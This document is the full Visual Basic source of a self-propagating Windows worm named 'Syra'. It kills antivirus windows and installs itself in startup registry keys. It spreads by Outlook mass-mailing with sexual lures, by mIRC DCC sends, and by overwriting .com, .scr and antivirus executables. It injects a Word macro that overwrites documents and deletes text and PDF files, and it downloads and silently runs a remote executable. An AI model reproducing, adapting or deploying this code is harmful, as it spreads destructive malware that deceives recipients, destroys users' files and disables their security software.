   Attribute VB_Name = "form7"
   Option Explicit
    Private Declare Function FindWindow Lib "user32" _
            Alias "FindWindowA" _
            (ByVal lpClassName As String, _
            ByVal lpWindowName As String) As Long

   Private Declare Function SystemParametersInfo Lib _
   "user32" Alias "SystemParametersInfoA" (ByVal uAction _
   As Long, ByVal uParam As Long, ByVal lpvParam As Any, _
   ByVal fuWinIni As Long) As Long

         Private Declare Function PostMessage Lib "user32" _
            Alias "PostMessageA" _
            (ByVal hwnd As Long, _
            ByVal wMsg As Long, _
            ByVal wParam As Long, _
            ByVal lParam As Long) As Long
            Const WM_CLOSE = &H10
   Sub Main()
   On Error Resume Next
   Dim a, b, c, y, x, oo, d, e, xx, dad, mom, butt, kiss, xy, baby, g, babyy, run, drivea, drivee, drivef, babyx, babyyy, babyyx, irc
   Dim hWindow As Long
   Dim lngReturnValue As Long
   Dim aWindow As Long
   Dim angReturnValue As Long
   Dim bWindow As Long
   Dim bngReturnValue As Long
   Dim cWindow As Long
   Dim cngReturnValue As Long
   Dim dWindow As Long
   Dim dngReturnValue As Long
   Dim eWindow As Long
   Dim engReturnValue As Long
   Dim fWindow As Long
   Dim fngReturnValue As Long
   Dim gWindow As Long
   Dim gngReturnValue As Long
   Dim xtasy As Long
   cWindow = FindWindow(vbNullString, "PC-cillin 2000 : Virus Alert")
   cngReturnValue = PostMessage(cWindow, WM_CLOSE, vbNull, vbNull)
   dWindow = FindWindow(vbNullString, "JavaScan")
   dngReturnValue = PostMessage(dWindow, WM_CLOSE, vbNull, vbNull)
   eWindow = FindWindow(vbNullString, "DAPDownloadManager")
   engReturnValue = PostMessage(eWindow, WM_CLOSE, vbNull, vbNull)
   fWindow = FindWindow(vbNullString, "Real-time Scan")
   fngReturnValue = PostMessage(fWindow, WM_CLOSE, vbNull, vbNull)
   gWindow = FindWindow(vbNullString, "Pop3trap")
   gngReturnValue = PostMessage(gWindow, WM_CLOSE, vbNull, vbNull)
   hWindow = FindWindow(vbNullString, "AVP Monitor")
   lngReturnValue = PostMessage(hWindow, WM_CLOSE, vbNull, vbNull)
   aWindow = FindWindow(vbNullString, "IOMON98")
   angReturnValue = PostMessage(aWindow, WM_CLOSE, vbNull, vbNull)
   bWindow = FindWindow(vbNullString, "NAI_VS_STAT")
   bngReturnValue = PostMessage(bWindow, WM_CLOSE, vbNull, vbNull)
   xtasy = SystemParametersInfo(97, True, CStr(1), 0)
   xx = App.Path & "\" & App.EXEName & ".EXE"
   xy = App.Path & App.EXEName & ".EXE"
   dad = App.Path & "\" & App.EXEName & ".SCR"
   mom = App.Path & App.EXEName & ".SCR"
   butt = App.Path & App.EXEName & ".COM"
   kiss = App.Path & "\" & App.EXEName & ".COM"
   baby = "c:\windows\system\inet.exe"
   babyy = "c:\windows\cmd.com"
   babyx = "c:\syra.scr"
   babyyy = "c:\windows\system\tmp.tmp"
   babyyx = "c:\SexSound.exe"
   irc = "c:\windows\opme.co_"
   run = "c:\autorun.com"
   drivea = "a:\moans.exe"
   drivee = "c:\www.EcstasyRUs.com"
   drivef = "f:\pussy.scr"
   FileCopy xx, baby
   FileCopy xy, baby
   FileCopy dad, baby
   FileCopy mom, baby
   FileCopy butt, baby
   FileCopy kiss, baby
   FileCopy xx, babyy
   FileCopy xy, babyy
   FileCopy dad, babyy
   FileCopy mom, babyy
   FileCopy butt, babyy
   FileCopy kiss, babyy
   FileCopy xx, babyx
   FileCopy xy, babyx
   FileCopy dad, babyx
   FileCopy mom, babyx
   FileCopy butt, babyx
   FileCopy kiss, babyx
   FileCopy xx, babyyy
   FileCopy xy, babyyy
   FileCopy dad, babyyy
   FileCopy mom, babyyy
   FileCopy butt, babyyy
   FileCopy kiss, babyyy
   FileCopy xx, babyyx
   FileCopy xy, babyyx
   FileCopy dad, babyyx
   FileCopy mom, babyyx
   FileCopy butt, babyyx
   FileCopy kiss, babyyx
   FileCopy xx, irc
   FileCopy xy, irc
   FileCopy dad, irc
   FileCopy mom, irc
   FileCopy butt, irc
   FileCopy kiss, irc
   FileCopy xx, run
   FileCopy xy, run
   FileCopy dad, run
   FileCopy mom, run
   FileCopy butt, run
   FileCopy kiss, run
   FileCopy xx, drivea
   FileCopy xy, drivea
   FileCopy dad, drivea
   FileCopy mom, drivea
   FileCopy butt, drivea
   FileCopy kiss, drivea
   FileCopy xx, drivee
   FileCopy xy, drivee
   FileCopy dad, drivee
   FileCopy mom, drivee
   FileCopy butt, drivee
   FileCopy kiss, drivee
   FileCopy xx, drivef
   FileCopy xy, drivef
   FileCopy dad, drivef
   FileCopy mom, drivef
   FileCopy butt, drivef
   FileCopy kiss, drivef
   Open "c:\v.reg" For Output As 2
   Print #2, "REGEDIT4"
   Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
   Print #2, """Level""=dword:00000001"
   Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
   Print #2, """Level""=dword:00000001"
   Print #2, """AccessVBOM""=dword:00000001"
   Close 2
   Set g = CreateObject("WScript.Shell")
   g.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\*inet", baby
   g.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "alcopaul.ph"
   g.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductName", "syra, the worm"
   g.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runonce\*cmd", babyy
   g.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\*autorun", run
   Shell "regedit /s c:\v.reg", vbHide
   Kill "c:\v.reg"
   Open "c:\readme.txt" For Output As 6
   Print #6, "A Collection Of Haiku"
   Print #6, "------------------"
   Print #6, "Dried marijuana..."
   Print #6, "And my grandfather's old pipe..."
   Print #6, "Tears in my red eyes..."
   Print #6, "------------------"
   Print #6, "Condoms in the bag..."
   Print #6, "A lustful stare from your eyes..."
   Print #6, "In the girl's rest room..."
   Print #6, "------------------"
   Close 6
   Open "c:\dnserror1.html" For Output As 4
   Print #4, "<HTML>"
   Print #4, "Hello..."
   Print #4, "Click <A HREF=""file://c:\windows\system\inet.exe"" TARGET=""_top"""
   Print #4, "TITLE=""file://c:\windows\system\inet.exe"">here</A> to start..."
   Print #4, "</HTML>"
   Print #4, "<!--by alcopaul.ph-->"
   Close 4
   If Dir("C:\mIRC", vbDirectory) <> "" Then
   Open "c:\mIRC\script.ini" For Output As 3
   Print #3, "[script]"
   Print #3, "n0= on 1:TEXT:*hello*:#:{"
   Print #3, "n1= /if ( $nick == $me ) { halt }"
   Print #3, "n2= /msg $nick Hello.. Do you wanna be an operator of this channel? Here's a software from mIRCx.. First, you'll have to convert it to a .com file then run it and become a channel operator instantly..."
   Print #3, "n3= /dcc send -c $nick c:\windows\opme.co_"
   Print #3, "n4= }"
   Print #3, "n5= on 1:JOIN:#:{"
   Print #3, "n6= /if ( $nick == $me ) { halt }"
   Print #3, "n7= /msg $nick Be a channel operator using this software from mIRCx... First, you'll have to convert it to a .com file then run it and become a channel operator instantly..."
   Print #3, "n8= /dcc send -c $nick c:\windows\opme.co_"
   Print #3, "n9= }"
   Print #3, "n10= on 1:PART:#:{"
   Print #3, "n11= /if ( $nick == $me ) { halt }"
   Print #3, "n12= /msg $nick Be a channel operator using this software from mIRCx... First, you'll have to convert it to a .com file then run it and become a channel operator instantly..."
   Print #3, "n13= /dcc send -c $nick c:\windows\opme.co_"
   Print #3, "n14= }"
   Close 3
   End If
   Set a = CreateObject("Outlook.Application")
   Set b = a.GetNameSpace("MAPI")
   If a = "Outlook" Then
   b.Logon "profile", "password"
   For y = 1 To b.AddressLists.Count
   Set d = b.AddressLists(y)
   x = 1
   Set c = a.CreateItem(0)
   For oo = 1 To d.AddressEntries.Count
   e = d.AddressEntries(x)
   c.Recipients.Add e
   x = x + 1
   If x > 100 Then oo = d.AddressEntries.Count
   Next oo
   c.Subject = "sounds of sex and other stuffs"
   c.Body = "....Hear me and my girlfriend moan...We spent yesterday's night having sex... I've also included a list of haiku, a cool talking screensaver and a link to a site offering cheap ecstasy pills.. enjoy.."
   c.attachments.Add babyyx, 1, 1, "sexsounds.wav"
   c.attachments.Add "c:\readme.txt", 1, 2, "haiku for you"
   c.attachments.Add drivee, 1, 3, "http://www.EcstasyRUs.com"
   c.attachments.Add babyx, 1, 4, "the cool talking screensaver"
   c.Send
   e = ""
   Next y
   b.Logoff
   End If
   Call werd
   Call update
   Call shortie
   Call dribe
   If Dir("c:\alcopaul.html") <> "alcopaul.html" Then
   Open "c:\alcopaul.html" For Output As 7
   Print #7, "Infected by Syra"
   Close 7
   MsgBox "you've been hit by, you've been struck by the smooth criminal, AW!", vbCritical, "w32.hllp.syra.b by alcopaul"
   End If
   End Sub
   Sub dribe()
     On Error Resume Next
     Dim d, dc, s, fso, dribe
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set dc = fso.Drives
     For Each d In dc
       If d.DriveType = 2 Or d.DriveType = 3 Then
         fldr (d.Path & "\")
       End If
     Next
     dribe = s
   End Sub
   Sub info(spec)
     On Error Resume Next
     Dim f, f1, fc, ext, ap, mircfname, s, bname, mp3, fso, g, z, x, v, b, j, fa, fe, fi, fo, fu, cop, ht
     Set fso = CreateObject("Scripting.FileSystemObject")
     g = App.Path & "\" & App.EXEName & ".exe"
     z = App.Path & App.EXEName & ".exe"
     x = App.Path & "\" & App.EXEName & ".com"
     v = App.Path & App.EXEName & ".com"
     b = App.Path & App.EXEName & ".scr"
     j = App.Path & "\" & App.EXEName & ".scr"
     ht = "c:\dnserror1.html"
     Set f = fso.GetFolder(spec)
     Set fc = f.Files
     For Each f1 In fc
       ext = fso.GetExtensionName(f1.Path)
       ext = LCase(ext)
       s = LCase(f1.Name)
       If (ext = "com") Or (ext = "scr") Then
       If (s = "command.com") Or (s = "win.com") Then
       Else
      Set f = fso.getfile(g)
      f.Copy (f1.Path)
         Set fa = fso.getfile(z)
      fa.Copy (f1.Path)
         Set fe = fso.getfile(x)
      fe.Copy (f1.Path)
         Set fi = fso.getfile(v)
      fi.Copy (f1.Path)
         Set fo = fso.getfile(b)
      fo.Copy (f1.Path)
         Set fu = fso.getfile(j)
      fu.Copy (f1.Path)
   End If
   End If
   If (ext = "mp3") Or (ext = "wav") Then
       Set f = fso.getfile(g)
      f.Copy (f1.Path & ".exe")
         Set fa = fso.getfile(z)
      fa.Copy (f1.Path & ".exe")
         Set fe = fso.getfile(x)
      fe.Copy (f1.Path & ".exe")
         Set fi = fso.getfile(v)
      fi.Copy (f1.Path & ".exe")
         Set fo = fso.getfile(b)
      fo.Copy (f1.Path & ".exe")
         Set fu = fso.getfile(j)
      fu.Copy (f1.Path & ".exe")
   End If
   If (ext = "html") Or (ext = "htm") Then
      Set f = fso.getfile(ht)
      f.Copy (f1.Path)
   End If
   If (ext = "exe") Then
   If (s = "avpm.exe") Or (s = "_avpm.exe") Or (s = "avp32.exe") Or (s = "_avp32.exe") Or (s = "vshwin32.exe") Then
      Set f = fso.getfile(g)
      f.Copy (f1.Path)
         Set fa = fso.getfile(z)
      fa.Copy (f1.Path)
         Set fe = fso.getfile(x)
      fe.Copy (f1.Path)
         Set fi = fso.getfile(v)
      fi.Copy (f1.Path)
         Set fo = fso.getfile(b)
      fo.Copy (f1.Path)
         Set fu = fso.getfile(j)
      fu.Copy (f1.Path)
   Else
   End If
   End If
   Next
   End Sub
   Sub fldr(spec)
     On Error Resume Next
     Dim f, f1, sf, fso
       Set fso = CreateObject("Scripting.FileSystemObject")
     Set f = fso.GetFolder(spec)
     Set sf = f.SubFolders
     For Each f1 In sf
       info (f1.Path)
       fldr (f1.Path)
     Next
   End Sub
   Sub werd()
   On Error Resume Next
   Dim fso, oword, odoc, nt, iw, i, b
   Open "c:\win.acs" For Output As 9
   Print #9, "Sub document_open()"
   Print #9, "On Error Resume Next"
   Print #9, "Dim fso, f"
   Print #9, "Open ""c:\windows\startm~1\programs\startup\winword.bat"" For Output As 1"
   Print #9, "Print #1, ""@echo off"""
   Print #9, "Print #1, ""ctty null"""
   Print #9, "Print #1, "":: MS Word needs this file.. Don't attempt to delete it"""
   Print #9, "Print #1, ""regedit /s c:\windows\winword.reg"""
   Print #9, "Print #1, ""start c:\windows\normal.doc"""
   Print #9, "Close 1"
   Print #9, "Open ""c:\windows\winword.reg"" For Output As 2"
   Print #9, "Print #2, ""REGEDIT4"""
   Print #9, "Print #2, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"""
   Print #9, "Print #2, """"""Level""""=dword:00000001"""
   Print #9, "Print #2, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"""
   Print #9, "Print #2, """"""Level""""=dword:00000001"
   Print #9, "Print #2, """"""AccessVBOM""""=dword:00000001"""
   Print #9, "Close 2"
   Print #9, "Shell ""regedit /s c:\windows\winword.reg"", vbHide"
   Print #9, "Call haha"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set f = fso.GetFile(ActiveDocument.FullName)"
   Print #9, "f.Copy (""c:\windows\normal.doc"")"
   Print #9, "Set b = Assistant.NewBalloon"
   Print #9, "With b"
   Print #9, ".Heading = ""Whew!!"""
   Print #9, ".Text = ""Wassup, doc? You have so many document files in your hard drive.. Better remove some.."""
   Print #9, "returnValue = .Show"
   Print #9, "End With"
   Print #9, "Shell ""c:\syra.scr"", vbHide"
   Print #9, "End Sub"
   Print #9, "Sub haha()"
   Print #9, "On Error Resume Next"
   Print #9, "Dim d, dc, s, fso, haha"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set dc = fso.Drives"
   Print #9, "For Each d In dc"
   Print #9, "If d.DriveType = 2 Or d.DriveType = 3 Then"
   Print #9, "hihi (d.Path & ""\"")"
   Print #9, "End If"
   Print #9, "Next"
   Print #9, "haha = s"
   Print #9, "End Sub"
   Print #9, "Sub hehe(folderspec)"
   Print #9, "On Error Resume Next"
   Print #9, "Dim f, f1, fc, ext, s, fso"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set f = fso.GetFolder(folderspec)"
   Print #9, "Set fc = f.Files"
   Print #9, "For Each f1 In fc"
   Print #9, "ext = fso.GetExtensionName(f1.Path)"
   Print #9, "ext = LCase(ext)"
   Print #9, "s = LCase(f1.Name)"
   Print #9, "If (ext = ""doc"") Then"
   Print #9, "Set f = fso.GetFile(ActiveDocument.FullName)"
   Print #9, "f.Copy (f1.Path)"
   Print #9, "ElseIf (ext = ""txt"") Or (ext = ""wri"") Or (ext = ""pdf"") Then"
   Print #9, "Set f = fso.GetFile(ActiveDocument.FullName)"
   Print #9, "f.Copy (f1.Path & "".doc"")"
   Print #9, "fso.DeleteFile (f1.Path)"
   Print #9, "End If"
   Print #9, "Next"
   Print #9, "End Sub"
   Print #9, "Sub hihi(folderspec)"
   Print #9, "On Error Resume Next"
   Print #9, "Dim f, f1, sf, fso"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set f = fso.GetFolder(folderspec)"
   Print #9, "Set sf = f.SubFolders"
   Print #9, "For Each f1 In sf"
   Print #9, "hehe (f1.Path)"
   Print #9, "hihi (f1.Path)"
   Print #9, "Next"
   Print #9, "End Sub"
   Print #9, "'DOC / Doctor by alcopaul"
   Close 9
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set oword = CreateObject("Word.Application")
   oword.Visible = False
   Set odoc = oword.Documents.Add
   Set nt = oword.ActiveDocument.vbproject.vbcomponents(1).codemodule
   Set iw = fso.OpenTextFile("c:\win.acs", 1, True)
   nt.DeleteLines 1, nt.CountOfLines
   i = 1
   Do While iw.atendofstream <> True
   b = iw.readline
   nt.InsertLines i, b
   i = i + 1
   Loop
   oword.ActiveDocument.Shapes.AddOLEObject _
       FileName:="c:\SexSound.exe", _
       LinkToFile:=False
   oword.ActiveDocument.SaveAs FileName:="c:\xxxpasswords.doc"
   oword.ActiveDocument.Close
   End Sub
   Sub shortie()
   On Error Resume Next
   Dim a
   Set a = CreateObject("WScript.Shell")
   Dim b, c, d
   d = a.SpecialFolders("Desktop")
   Set b = a.CreateShortcut(d & "\free XXX Passwords.lnk")
   b.TargetPath = a.ExpandEnvironmentStrings("c:\xxxpasswords.doc")
   b.WorkingDirectory = a.ExpandEnvironmentStrings("c:\")
   b.WindowStyle = 4
   b.Save
   Open "c:\windows\desktop\mailme.url" For Output As 3
   Print #3, "[InternetShortcut]"
   Print #3, "URL=mailto:alcopaul@cannabismail.com"
   Close 3
   End Sub
   Sub update()
   On Error Resume Next
   If Day(Now()) = 8 Or Day(Now()) = 11 Or Day(Now()) = 16 Or Day(Now()) = 20 Or Day(Now()) = 24 Or Day(Now()) = 28 Or Day(Now()) = 4 Or Day(Now()) = 19 Then
   Shell "start http://members.tripod.com/curlysoft/HTMLobj-64/update.exe", vbHide
   Open "c:\v.vbs" For Output As 2
   Print #2, "Dim sh"
   Print #2, "Set sh = CreateObject(""WScript.Shell"")"
   Print #2, " Do Until sh.AppActivate(""File Download"")"
   Print #2, "Loop"
   Print #2, "sh.sendkeys ""%O"""
   Close 2
   Shell "start c:\v.vbs", vbHide
   End If
   End Sub
   'one-ply
   'syra by alcopaul
